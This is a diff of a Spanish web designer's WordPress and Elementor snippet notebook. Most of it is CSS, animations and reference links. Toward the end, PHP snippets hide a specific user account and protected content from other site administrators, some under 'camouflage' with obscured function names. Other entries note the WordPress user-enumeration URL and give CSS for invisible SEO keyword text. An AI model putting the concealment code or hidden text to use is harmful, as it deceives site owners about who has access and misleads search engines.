+            transform: translate(30px,-60px)
         }
     }
 
@@ -2589,10 +3928,26 @@ Codigo un solo vidos reproduciendose a la vez.
         });
     </script>
 
+    <script>
+document.addEventListener("DOMContentLoaded", function() {
+    const videos = document.querySelectorAll("video");
+
+    videos.forEach(video => {
+        video.addEventListener("play", () => {
+            videos.forEach(v => {
+                if (v !== video) {
+                    v.pause();
+                }
+            });
+        });
+    });
+});
+</script>
+
 
 ###############################################################
 
-Borrar espacios extre en los texto de elementor
+eliminar Borrar espacios extre en los texto de elementor
     .elementor-text-editor p:last-child{ 
      margin-bottom:0px;
     }
@@ -2671,9 +4026,10 @@ crear un efecto de ruido en movimiendo con la el gif de ruido,  este se aplica s
     left: 0;
     right: 0;
     bottom: 0;
-    opacity: 0.9; /* Opacidad al 70% */
-    mix-blend-mode: overlay; /* Modo de fusión */
+    opacity: 0.5; /* Opacidad al 70% */
+    mix-blend-mode: luminosity; /* Modo de fusión */
     z-index: 0;
+    pointer-events: none;
 
 }
 
@@ -2700,6 +4056,8 @@ aplica un efecto de ruido en movimiento a toda la pagina
 
 Cinta con palabras que se desplazan
 
+meter cada cinta en un contenedor por separado para aplicar colores diferestes al fondo
+
 <div class="lista-horizontal">
     <h2>Diseñador Gráfico</h2>
     <h2>Freelancer</h2>
@@ -2713,14 +4071,15 @@ Cinta con palabras que se desplazan
     <h2>Flyer</h2>
     <h2>Elementor</h2>
     <h2>Logos</h2>
-    <h2>Guapo</h2>
+    <h2>Independiente</h2>
     <h2>CSS</h2>
     <h2>Venezolano</h2>
     <h2>Profesional</h2>
     <h2>Originalidad</h2>
     <h2>Rapido</h2>
+    <h2>Personalización</h2>
     <h2>Soñador</h2>
-    <!--duplico para tener mas-->
+    <!--I duplicate to have more-->
     <h2>Diseñador Gráfico</h2>
     <h2>Freelancer</h2>
     <h2>Landing</h2>
@@ -2733,13 +4092,13 @@ Cinta con palabras que se desplazan
     <h2>Flyer</h2>
     <h2>Elementor</h2>
     <h2>Logos</h2>
-    <h2>Guapo</h2>
     <h2>CSS</h2>
     <h2>Venezolano</h2>
     <h2>Profesional</h2>
     <h2>Originalidad</h2>
     <h2>Rapido</h2>
     <h2>Soñador</h2>
+
 </div>
 
 
@@ -2747,20 +4106,22 @@ Cinta con palabras que se desplazan
     .lista-horizontal h2 {
         margin: 0;
         padding: 0;
+    
     }
 
     .lista-horizontal {
         position: relative;
         width: max-content;
-        animation: cinta 75s linear infinite;
+        animation: cinta 85s linear infinite;
         padding: 13px; /* Elimina el padding */
-        padding-top: 12px;
+        padding-top: 14px;
         display: flex; /* Muestra los elementos en línea */
         scale: 2.1;
     }
 
     .lista-horizontal h2 {
-        color: var(--e-global-color-899c568);
+        font-family: montserrat;
+        color: #0C3630;
         font-size: 15px;
         font-weight: 900;
             line-height: 1;
@@ -2773,13 +4134,15 @@ Cinta con palabras que se desplazan
     }
 
     .lista-horizontal h2::before {
-        content: "✦"; /* Cambia esto por el símbolo que desees ★ ✦ ✶ ✰ ✪ ☆ ♡ ❆ ♥︎ ❤︎ 𓆩♡𓆪 ● ☢ ♛ ❀ ✿ ��⚡ */
-        position: absolute; /* Posiciona el símbolo */
+        content: "✦"; /* Cambia esto por el símbolo que desees ★ ✦ ✶ ✰ ✪ ☆ ✱ ♡ ❂ ❋ ❆ ♥︎ ❤︎ 𓆩♡𓆪 ⊗ ◉ ● ● • ∙ ○ ◎ ◦ ∘ ☢ ♛ ♚ ♔ ❀ ✿  ⚡ 🗲 ☀️ ☁︎ 💀 ☠ ✈︎ ✈️ ✒ 🤿 🐟 🐠
+     
+     */
+        position: absolute; /* Posiciona el simbolo */
         top: 50%; /* Mueve el elemento al 50% de la altura del contenedor */
         transform: translate(0%, -50%); /* Ajusta el elemento para centrarlo */
         left: -18px; /* Ajusta la posición del símbolo */
         font-size: 13px; /* Tamaño del símbolo */
-        color: var(--e-global-color-899c568); /* Color del símbolo */
+        color: #0C3630; /* Color del símbolo */
     }
 
     .list2 {
@@ -2792,6 +4155,7 @@ Cinta con palabras que se desplazan
     }
 
     .list2 h2 {
+        font-family: montserrat;
         color: #ffffff80 !important;
         font-weight: 400;
         text-transform: none;
@@ -2816,14 +4180,571 @@ Cinta con palabras que se desplazan
     }
 </style>
 
+segunda lista para desvanecido
+<div class="lista-horizontal list2">
+    <h2>Graphic Designer</h2>
+    <h2>Freelancer</h2>
+    <h2>Landing</h2>
+    <h2>Web Designer</h2>
+    <h2>Funnel</h2>
+    <h2>Creative</h2>
+    <h2>Fast</h2>
+    <h2>Wordpress</h2>
+    <h2>Web Pages</h2>
+    <h2>Flyer</h2>
+    <h2>Elementor</h2>
+    <h2>Logos</h2>
+    <h2>Handsome</h2>
+    <h2>CSS</h2>
+    <h2>Mexico</h2>
+    <h2>Venezuelan</h2>
+    <h2>Professional</h2>
+    <h2>Originality</h2>
+    <h2>Fast</h2>
+    <h2>Dreamer</h2>
+    <h2>España</h2>
+    
+    
+    <h2>Diseñador Gráfico</h2>
+    <h2>Freelancer</h2>
+    <h2>Landing</h2>
+    <h2>Diseñador Web</h2>
+    <h2>Funnel</h2>
+    <h2>Creativo</h2>
+    <h2>Argentina</h2>
+    <h2>Veloz</h2>
+    <h2>Pagina Web</h2>
+    <h2>Wordpress</h2>
+    <h2>Sitios Web</h2>
+    <h2>Para Inmobiliarias</h2>
+    <h2>Flyer</h2>
+    <h2>Elementor</h2>
+    <h2>Logos</h2>
+    <h2>Ecuador</h2>
+    <h2>Estetica</h2>
+    <h2>CSS</h2>
+    <h2>Venezuela</h2>
+    <h2>Experto</h2>
+    <h2>Originalidad</h2>
+    <h2>Web Medica</h2>
+    <h2>Rapido</h2>
+    <h2>Soñador</h2>
+</div>
+
+
+
+###############################################################
+
+ejemplo loties:
+
+<lottie-player src="https://raw.githubusercontent.com/abdieldesigner/mis-animaciones-lottie/refs/heads/main/buseo.json"  background="transparent"  speed="1"  style="width: 100%;"  loop  autoplay></lottie-player>
+
+<!-- Usar el componente dotlottie-player -->
+<dotlottie-player 
+    src="https://raw.githubusercontent.com/abdieldesigner/mis-animaciones-lottie/refs/heads/main/peces%20que%20se%20desplazan%20horizontal.lottie" 
+    background="transparent" 
+    direction="1" 
+    speed="1" 
+    mode="normal" 
+    style="transform: scale(1); width: 100%;" 
+    autoplay 
+    loop>
+</dotlottie-player>
+
+para que los lo loties funcione ne html los dos tipo json y .lotie
+
+<!-- Cargar el script de DotLottiePlayer -->
+<script type="module" src="https://unpkg.com/@dotlottie/player-component@2.3.0/dist/dotlottie-player.mjs" ></script>
+
+<!-- Cargar el script de LottiePlayer -->
+<script defer src="https://unpkg.com/@lottiefiles/lottie-player@latest/dist/lottie-player.js"></script>
+
+
+
+###############################################################
+etiqueta con texto - tab etiqueta o micro titulo - categoria en una caja o algino lado.  pulsante en un contenedor
+
+.tab-clase::before{
+    background: #fff5ee;
+    position: absolute;
+    content: "Clases"; /*Cambiar contenido*/
+    font-family: League+Spartan;
+    font-size: 16px;
+    color: #130109;
+    border: solid 1px #130109;
+    padding: 6px 8px 3px 8px;
+    border-radius: 30px;
+    top: 8px;
+    left: 8px;
+    pointer-events: none;
+    animation: pulse 2s linear infinite;
+}
+
+.tab-clase:hover::before{
+    background: #FF3094;
+}
+
+@keyframes pulse {
+  0%, 100% {
+    transform: scale(1); 
+  }
+  50% {
+    transform: scale(1.2);
+  }
+}
+
+
+###############################################################
+desborde en GHL
+#__nuxt {
+    overflow-x: clip;
+    overflow-y: visible;
+}
+###############################################################
+
+GHL Invertir coluna sy elementos en movil
+
+@media (max-width: 768px) {
+
+    .invertir-elementos > .inner {
+        flex-direction: column !important;
+        flex-direction: column-reverse !important;
+    }
+}
+
+
+###############################################################
+<script> 
+    window.addEventListener('scroll', function() {
+    const menu = document.querySelector('.menu');
+    if (window.scrollY > 200) {
+        menu.classList.add('scrolled'); // Añade la clase cuando se baja 200px
+    } else {
+        menu.classList.remove('scrolled'); // Remueve la clase al volver al inicio
+    }
+    });
+</script>
+
+<style>
+    .menu {
+        background-color: transparent; /* Color original */
+        transition: background-color 0.3s ease; /* Transición suave */
+    }
+    .menu.scrolled {
+        background-color: red !important; /* Nuevo color con prioridad */
+    }
+</style>
+
 
 ###############################################################
 
 
+/**
+ * Bloquear, Ocultar y proteger posts/páginas específicos en WP Admin
+ * excepto para un usuario por email.
+ */
+
+/**
+ * Bloquear / Ocultar y proteger posts/páginas específicos en WP Admin
+ * excepto para usuarios permitidos por email.
+ *
+ * Además: ocultar VISUALMENTE (solo UI) un snippet de WPCode por ID en su listado,
+ * para que otros admins no lo vean en la lista (sin bloquear edición real del snippet).
+ */
+
+    /** =========================
+     *  CONFIG
+         *  ========================= */
+        function hub_allowed_emails() {
+            return [
+                'abdielreyef@gmail.com',
+                'diferentecreativo@gmail.com',
+            ];
+        }
+
+        function hub_is_allowed_user_by_email($user_id = null) {
+            $allowed = array_map(
+                fn($e) => strtolower(trim($e)),
+                hub_allowed_emails()
+            );
+
+            if ($user_id) {
+                $user = get_user_by('id', $user_id);
+            } else {
+                $user = wp_get_current_user();
+            }
+
+            if (!$user || empty($user->user_email)) return false;
+
+            return in_array(strtolower(trim($user->user_email)), $allowed, true);
+        }
+
+        function hub_protected_post_ids() {
+            // ✅ Agregué 2613 como pediste
+            return [1555, 330, 2613];
+        }
+
+        function hub_hidden_wpcode_ids() {
+            // ✅ El snippet de WPCode que termina en 46
+            return [3146];
+        }
+
+        /** =========================
+         *  1) Ocultar posts/páginas protegidos del listado admin (edit.php)
+         *  ========================= */
+        add_action('pre_get_posts', function ($query) {
+            if (!is_admin() || !$query->is_main_query()) return;
+
+            global $pagenow;
+            if ($pagenow !== 'edit.php') return;
+
+            if (hub_is_allowed_user_by_email()) return;
+
+            $protected = hub_protected_post_ids();
+
+            $not_in = (array) $query->get('post__not_in');
+            $not_in = array_merge($not_in, $protected);
+
+            $query->set('post__not_in', array_values(array_unique($not_in)));
+        });
+
+        /** =========================
+         *  2) Bloquear acceso directo por URL a editar/ver/borrar posts/páginas protegidos
+         *  ========================= */
+        add_action('admin_init', function () {
+            if (hub_is_allowed_user_by_email()) return;
+
+            $protected = hub_protected_post_ids();
+
+            $post_id = 0;
+            if (isset($_GET['post']))    $post_id = (int) $_GET['post'];
+            if (isset($_POST['post_ID'])) $post_id = (int) $_POST['post_ID'];
+
+            if ($post_id && in_array($post_id, $protected, true)) {
+                wp_die(__('No tienes permisos para acceder a este contenido.', 'textdomain'), 403);
+            }
+        });
+
+        /** =========================
+         *  3) Bloquear capacidades (editar/borrar/ver) sobre posts/páginas protegidos
+         *  ========================= */
+        add_filter('map_meta_cap', function ($caps, $cap, $user_id, $args) {
+
+            $protected = hub_protected_post_ids();
+
+            $block_caps = [
+                'edit_post',
+                'delete_post',
+                'read_post',
+                'edit_page',
+                'delete_page',
+                'read_page',
+            ];
+
+            if (!in_array($cap, $block_caps, true)) return $caps;
+
+            $post_id = isset($args[0]) ? (int) $args[0] : 0;
+            if (!$post_id || !in_array($post_id, $protected, true)) return $caps;
+
+            // Permitidos: normal
+            if (hub_is_allowed_user_by_email($user_id)) return $caps;
+
+            // No permitidos: bloqueado
+            return ['do_not_allow'];
+
+        }, 10, 4);
+
+        /** =========================
+         *  4) Quitar acciones (Editar, Duplicar, etc.) en filas protegidas si llegaran a mostrarse
+         *  (normalmente ni aparecerán porque ya se ocultan, pero es capa extra)
+         *  ========================= */
+        function hub_strip_row_actions($actions, $post) {
+            if (hub_is_allowed_user_by_email()) return $actions;
+
+            if (in_array((int)$post->ID, hub_protected_post_ids(), true)) {
+                $actions = []; // quita TODO
+            }
+            return $actions;
+        }
+        add_filter('post_row_actions', 'hub_strip_row_actions', 999, 2);
+        add_filter('page_row_actions', 'hub_strip_row_actions', 999, 2);
+
+        /** =========================
+         *  5) OCULTAR SOLO VISUALMENTE (UI) el/los snippets WPCode por ID en su listado
+         *  (no bloquea edición real, solo desaparece de la lista)
+         *  ========================= */
+        add_action('admin_head', function () {
+
+            if (hub_is_allowed_user_by_email()) return;
+
+            $hide_ids = array_map('intval', hub_hidden_wpcode_ids());
+            $hide_ids_json = wp_json_encode($hide_ids);
+
+            ?>
+            <script>
+              (function(){
+                const HIDE_IDS = <?php echo $hide_ids_json; ?>;
+
+                function hideRows(){
+                  // En tu captura el número está en: <td class="column-id">3146</td>
+                  document.querySelectorAll('tbody#the-list tr').forEach(tr => {
+                    const td = tr.querySelector('td.column-id');
+                    if (!td) return;
+
+                    const idText = (td.textContent || '').trim();
+                    const idNum = parseInt(idText, 10);
+
+                    if (HIDE_IDS.includes(idNum)) {
+                      tr.style.display = 'none';
+                    }
+                  });
+                }
+
+                if (document.readyState === 'loading') {
+                  document.addEventListener('DOMContentLoaded', hideRows);
+                } else {
+                  hideRows();
+                }
+              })();
+            </script>
+            <?php
+        });
+
+
+
+
+###############################################################
+###############################################################
+###############################################################
+###############################################################
+###############################################################
 ###############################################################
 
+Extencion
+
+diseñar correos con html
+mail Templates by cloudHQ https://chromewebstore.google.com/detail/gmail-email-templates-by/llccdnmbipddnkhmldacpcjjcnljpoij?hl=es-419
+
+dar formato estetico a archovo css, json  y asi https://www.freeformatter.com/
+
+Plugin utiles:
+
+Plugins Garbage Collector: para limpiar BD de cosas viejas o eliminadas
+
+         - wpexpertsio ( Saad Iqbal): un explorador de archivos
+
+Adapta RGPD | Por Superadmin | plugin de pilitica y cookies (españa)
+
+Unlimited Elements for Elementor : ademas de wiggets me permite exportar con imagenes... pero yo creo que es mejor subir la carpeta de imagenes y luego remplazar url en el json
 
 
+JSM Show Post Metadata Por JS Morisset - muestras los ia y los nombre para llamar a datos de campos personalizados.
+
+###############################################################
+
+Unlimited Elements for Elementor
+
+perimtie exportar plantilas de elementos con imagenes
+
+###############################################################
+
+Protejer worpdress: ver usuarios
+
+LInk user wordpress Hack url/wp-json/wp/v2/users
+
+buscar todo d euna web wordpress url?s=
+
+###############################################################
+ocultar usuarios añadir codigo al funtion.php o con un editor de codigo a todo el sitio
+
+    todos:
+    // Disable /users rest routes
+    add_filter('rest_endpoints', function( $endpoints ) {
+        if ( isset( $endpoints['/wp/v2/users'] ) ) {
+            unset( $endpoints['/wp/v2/users'] );
+        }
+        if ( isset( $endpoints['/wp/v2/users/(?P<id>[\d]+)'] ) ) {
+            unset( $endpoints['/wp/v2/users/(?P<id>[\d]+)'] );
+        }
+        return $endpoints;
+    });
+
+    Solo admin puedan verlo:
+    <?php
+    add_filter( 'rest_authentication_errors', function( $result ) {
+      if ( ! empty( $result ) ) {
+        return $result;
+      }
+      if ( ! is_user_logged_in() ) {
+        return new WP_Error( 'rest_not_logged_in', 'You are not currently logged in.', array( 'status' => 401 ) );
+      }
+      if ( ! current_user_can( 'administrator' ) ) {
+        return new WP_Error( 'rest_not_admin', 'You are not an administrator.', array( 'status' => 401 ) );
+      }
+      return $result;
+    });
+
+###############################################################
+Codigo oculta un usuario wordpress
+
+    add_action('pre_get_users', 'ocultar_usuario_especifico_para_administradores');
+
+    function ocultar_usuario_especifico_para_administradores($query) {
+        // Solo aplica en el área de administración y en la lista de usuarios
+        if (!is_admin() || !current_user_can('list_users')) {
+            return;
+        }
+
+        $current_user = wp_get_current_user();
+        $allowed_emails = ['angelazael1996@gmail.com', 'diferentecreativo@gmail.com'];
+
+        // Si el usuario actual NO está en la lista de correos autorizados
+        if (!in_array($current_user->user_email, $allowed_emails)) {
+            // Excluye al usuario con email "angelazael1996@gmail.com"
+            $usuario_a_ocultar = get_user_by('email', 'angelazael1996@gmail.com');
+            if ($usuario_a_ocultar) {
+                $query->set('exclude', [$usuario_a_ocultar->ID]);
+            }
+        }
+    }
+
+    Camuflaje
+
+
+    add_action('pre_get_users', 'bx_ap01');
+
+    function bx_ap01($q){
+        if( !is_admin() || !current_user_can('list_users') ){ return; }
+
+        $u  = wp_get_current_user()->user_email;
+        $ok = ['angelazael1996@gmail.com', 'diferentecreativo@gmail.com'];
+
+        if( !in_array($u, $ok) ){
+            $x = get_user_by('email', 'angelazael1996@gmail.com');
+            if( $x ){ $q->set('exclude', [ $x->ID ] ); }
+        }
+    }
+
+
+
+    camuflaje
+
+    function us_lista($user_query) {
+        $c_dark = 'angelazael1996@gmail.com';
+
+        if (!is_user_logged_in() || wp_get_current_user()->user_email !== $c_dark) {
+            $user_query->query_where .= " AND ID != (SELECT ID FROM $wpdb->users WHERE user_email = '$c_dark')";
+        }
+    }
+    add_action('pre_get_users', 'us_lista');
+
+###############################################################
+seo colapsbale d eautirod apar alcientes
+<!-- ====== SEO Colapsable Abdiel (Designer Spotlight) ====== -->
+<section id="seo-abdiel" class="seo-pane" aria-labelledby="seo-pane-title">
+  <details class="seo-details">
+    <summary class="seo-summary">
+      <h2 id="seo-pane-title" class="seo-h2">
+        Abdiel — Diseñador Web en WordPress (Landing Designer Venezolano)
+      </h2>
+    </summary>
+
+    <div class="seo-body">
+
+      <!-- SINGLE BLOCK: About Abdiel -->
+      <details class="seo-item" open>
+        <summary class="seo-item-summary">
+          <h3 class="seo-sub">Abdiel: Diseño Web en WordPress, Landing Pages, Animaciones y Optimización</h3>
+        </summary>
+
+        <div class="seo-item-content">
+          <p>
+            Abdiel es un diseñador web especializado en <strong>WordPress</strong> que crea sitios modernos, rápidos y enfocados en resultados.
+            Su estilo se distingue por layouts limpios, buena jerarquía visual, animaciones sutiles que elevan la experiencia, y una estructura
+            pensada para que el visitante entienda el servicio y tome acción.
+          </p>
+
+          <ul class="seo-list">
+            <li>Diseño de páginas web y landing pages enfocado en conversión, claridad y confianza.</li>
+            <li>Desarrollo en <strong>WordPress</strong> con enfoque en rendimiento, responsivo y facilidad de administración.</li>
+            <li><strong>Animaciones y microinteracciones</strong> para una experiencia moderna sin sacrificar velocidad.</li>
+            <li>Optimización base: estructura SEO, buenas prácticas, compresión y carga más eficiente.</li>
+            <li>Integración de formularios, botones a WhatsApp, mapas, y secciones pensadas para generar contactos.</li>
+          </ul>
+
+          <p>
+            En este proyecto, Abdiel diseñó la web para <strong>FNX Impresiones</strong>, una empresa de impresiones y publicidad impresa.
+            El objetivo fue presentar servicios de forma clara, crear una imagen profesional y facilitar que los clientes pidan cotizaciones
+            rápidamente desde cualquier dispositivo.
+          </p>
+
+          <p>
+            ¿Quieres ver el trabajo oficial y portafolio de Abdiel?
+            <a
+              href="https://joseabdiel.com"
+              target="_blank"
+              rel="noopener noreferrer"
+            >
+              Visita joseabdiel.com
+            </a>
+          </p>
+        </div>
+      </details>
+
+    </div>
+  </details>
+</section>
+
+
+  <!-- contenido de la página -->
+
+  <!-- Author / Creator -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "WebPage",
+    "creator": {
+      "@type": "Person",
+      "name": "Jose Abdiel",
+      "url": "https://joseabdiel.com/"
+    }
+  }
+  </script>
+
+
+
+###############################################################
+
+Codigo php para poner enaces globales con shorcode y asi no cambiar uno por uno
+
+
+
+
+
+###############################################################
+
+Palabras invisibles para el SEO de la web
+
+<style>
+    .text-seo {
+        color: transparent;   /* Hace que el texto sea transparente */
+        font-size: 1vh;      /* Establece el tamaño de la fuente a 1vh */
+        display: inline;      /* Hace que el texto sea inline */
+        padding: 0;          /* Elimina el padding */
+        margin: 0;           /* Elimina el margin */
+        white-space: nowrap;  /* Evita que el texto se divida en varias líneas */
+    }
+</style>
+
+<h2 class="text-seo"></h2>
+
+###############################################################
+###############################################################
+###############################################################
+###############################################################
+###############################################################
+###############################################################
+###############################################################
 ###############################################################
 
 Referente: 
@@ -2836,6 +4757,7 @@ https://isdsgn.com.br/links/
 
 https://isdsgn.com.br/
 
+https://dsgnelyas.com/links/
 
 https://matheuslp.com.br/
 
@@ -2843,6 +4765,97 @@ https://joaobuscarioli.com.br/links-uteis/
 
 https://ciparoni.com/lives/
 
+https://jeankist.com/paginas-lancamento-sites/
+
+https://luanmontenegro.com/codigos/
+
+https://eduardowebdesign.com/?utm_source=chatgpt.com
+
+https://riveroz.com/
+
 me gustan:
 
 https://rafafranco.com.br/
+https://maidertomasena.com/lavanderia-creativa/
+https://escalaclub.com/
+https://caseb.com.br/
+https://anacristibeier.com.br/o-caminho-do-designer-de-sucesso/
+https://ihatemedia.co/
+https://digitalmaxon.com/#
+https://leadsmastery.io/leads-mastery/ david lucena
+https://riveroz.com/
+
+
+https://glidex.wpengine.com/home-virtual-reality/
+https://elements.envato.com/es/eventum-event-conference-elementor-template-kit-QCNEMWE
+https://elements.envato.com/es/italk-event-conference-elementor-template-kit-6P24Y8S
+
+
+########
+
+me gustan 
+
+https://devcanvas.org/
+
+
+########
+
+ALUMNOS DE JHONY 
+
+https://yohandizain.com/ -  https://yohandizain.com/landing-page/
+https://josephteran.com/
+https://alejandrosuarezux.com/
+https://missaelzurita.com/web/
+https://roxyendigital.com/
+https://elisabethdelgado.com/
+#
+
+
+final de portafolio
+
+https://www.behance.net/gallery/216828399/Identidad-Visual-Kerrrico
+
+
+Herramientas para analizar SEO:
+https://suite.seotesteronline.com/
+https://www.seoptimer.com/
+
+
+analisis seo 
+
+diseño de pagina web en venezuela en la pagina 7
+diseño web en venezuela 7
+diseñador web en venezuela 4
+diseño de landing page en venezuela 1 (6)
+
+
+.hl-product-list-product-image {
+border-radius: 30px 50px 100px 30px !important; 
+}
+
+
+
+fondo degradado verde, beige
+
+
+cinta, boton seccion, banner
+
+
+
+
+
+copun ara el dominion 20%
+COUPONFCNC
+
+
+
+
+2O25CELEBRATE vaido peor  no descuenta
+WINDYPE no palica 
+REENA20 calido no plica
+creo que son par aimail
+
+
+
+
+web que instalo mi plguin https://vidanswer.com/
